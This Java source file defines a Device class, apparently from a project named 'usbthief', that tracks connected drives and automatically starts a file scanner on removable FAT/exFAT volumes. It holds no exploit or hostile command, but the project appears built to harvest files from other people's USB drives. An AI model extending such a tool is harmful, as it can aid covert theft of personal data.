package com.superredrock.usbthief.core;

import com.superredrock.usbthief.worker.DeviceScanner;

import java.io.IOException;
import java.nio.file.*;
import java.util.Objects;
import java.util.logging.Logger;

import static com.superredrock.usbthief.core.DeviceUtils.getHardDiskSN;

public class Device {

    public enum DeviceState {
        // Connection status
        OFFLINE,       // Device plug out
        UNAVAILABLE,   // Device exists but inaccessible (AccessDeniedException / IOException)

        // Available status
        IDLE,          // Device ready, no active operations
        SCANNING,      // DeviceScanner is running

        // User control
        DISABLED       // Manually disabled by user (no automatic transitions)
    }

    protected static final Logger logger = Logger.getLogger(Device.class.getName());

    private Path rootPath;
    private final String serialNumber;
    private FileStore fileStore = null;
    private String volumeName = "";
    private DeviceScanner scanner;
    private DeviceState state;
    private boolean stateChange = false;
    private boolean ghost;
    private boolean systemDisk;

    protected Device(Path rootPath) {
        this.rootPath = rootPath;
        this.serialNumber = getHardDiskSN(rootPath.toString());
        this.ghost = false;
        this.systemDisk = false;
        initializeState();
    }

    protected Device(String serialNumber) {
        this(serialNumber, "");
    }

    protected Device(String serialNumber, String volumeName) {
        this.rootPath = null;
        this.serialNumber = serialNumber;
        this.fileStore = null;
        this.volumeName = volumeName != null ? volumeName : "";
        this.ghost = true;
        this.state = DeviceState.OFFLINE;
        this.systemDisk = false;
    }

    private void initializeState() {
        if (Files.exists(rootPath) && Files.isDirectory(rootPath)){
            try {
                this.fileStore = Files.getFileStore(rootPath);
                this.volumeName = fileStore.name();
                state = DeviceState.IDLE;
            } catch (IOException e) {
                this.state = DeviceState.UNAVAILABLE;
            }
        }else {
            state = DeviceState.UNAVAILABLE;
        }
        if (this.fileStore != null && !(this.fileStore.type().equals("exFAT") || this.fileStore.type().equals("FAT32"))){
            this.systemDisk = true;
        };
        if (isSystemDisk()) {
            this.state = DeviceState.DISABLED;
        }
    }

    public Path getRootPath() {
        return rootPath;
    }

    public String getSerialNumber() {
        return serialNumber;
    }

    public boolean isGhost() {
        return ghost;
    }

    public boolean isSystemDisk() {
        return systemDisk;
    }

    public String getVolumeName() {
        return volumeName;
    }

    protected void setVolumeName(String volumeName) {
        this.volumeName = volumeName != null ? volumeName : "";
    }

    protected void merge(Path newRootPath) {
        if (!ghost || rootPath != null) {
            return;
        }
        this.rootPath = newRootPath;
        initializeState();
        this.ghost = false;
    }

    /**
     * Converts this device to ghost state.
     * Called when device is unplugged (NoSuchFileException).
     * Clears rootPath and fileStore, sets ghost=true, state=OFFLINE.
     */
    protected void convertToGhost() {
        this.rootPath = null;
        this.fileStore = null;
        this.ghost = true;
        this.state = DeviceState.OFFLINE;
        logger.fine("Device converted to ghost: " + serialNumber);
    }

    public FileStore getFileStore() {
        return fileStore;
    }

    public DeviceState getState() {
        return state;
    }

    public boolean isChangeAndReset(){
        boolean flag = this.stateChange;
        this.stateChange = false;
        return flag;
    }

    public void updateState(){
        // Skip if manually disabled
        if (this.state == DeviceState.DISABLED) {
            return;
        }

        try {
            this.fileStore = Files.getFileStore(rootPath);
            this.volumeName = fileStore.name();
            // Device is accessible - keep current state (IDLE/SCANNING handled by update())
        } catch (IOException e) {
            if (e instanceof NoSuchFileException) {
                // Device unplugged - convert to ghost state
                if (!ghost) {
                    checkChangeAndUpdate(DeviceState.OFFLINE);
                    convertToGhost();
                }
            } else if (e instanceof AccessDeniedException) {
                checkChangeAndUpdate(DeviceState.UNAVAILABLE);
            } else {
                checkChangeAndUpdate(DeviceState.UNAVAILABLE);
                DeviceManager.logger.throwing("Device","updateState",e);
            }
        }
    }

    public void update(){
        // Check connection status first (skip if disabled)
        if (this.state != DeviceState.DISABLED) {
            updateState();
        }

        // Only handle available state transitions
        switch (this.state) {
            case IDLE -> {
                // Start scanner if filesystem type matches
                if (this.fileStore != null){
                    if (scanner != null && scanner.isAlive()){
                        scanner.interrupt();
                    }
                    scanner = new DeviceScanner(this, this.fileStore);
                    scanner.start();
                    checkChangeAndUpdate(DeviceState.SCANNING);
                }
            }
            case SCANNING -> {
                // Transition back to IDLE if scanner terminated
                if (scanner != null && scanner.getState() == Thread.State.TERMINATED){
                    scanner = null;
                    checkChangeAndUpdate(DeviceState.IDLE);
                }
            }
            case DISABLED -> stopScanning();
            default -> {} // OFFLINE, UNAVAILABLE: no transitions
        }
    }

    protected void checkChangeAndUpdate(DeviceState state){
        if (this.state != state){
            stateChange = true;
        }
        this.state = state;
    }

    public void disable(){
        checkChangeAndUpdate(DeviceState.DISABLED);
        stopScanning();
    }

    public void enable(){
        if (this.state == DeviceState.DISABLED) {
            // Transition to IDLE temporarily, actual state will be determined in next update
            checkChangeAndUpdate(DeviceState.IDLE);
        }
    }

    public void stopScanning(){
        if (this.scanner != null && this.scanner.isAlive()){
            // Interrupt the thread to stop any ongoing operations (initial scan or monitoring)
            this.scanner.interrupt();
            // Stop the WatchService monitoring
            this.scanner.stopMonitoring();
        }
    }

    @Override
    public int hashCode() {
        return Objects.hash(serialNumber);
    }

    @Override
    public boolean equals(Object o) {
        if (!(o instanceof Device device)) return false;
        return Objects.equals(serialNumber, device.serialNumber);
    }

    @Override
    public String toString() {
        return "Device{" +
                "rootPath=" + rootPath +
                ", fileStore=" + fileStore +
                ", scanner=" + scanner +
                ", state=" + state +
                ", stateChange=" + stateChange +
                '}';
    }
}
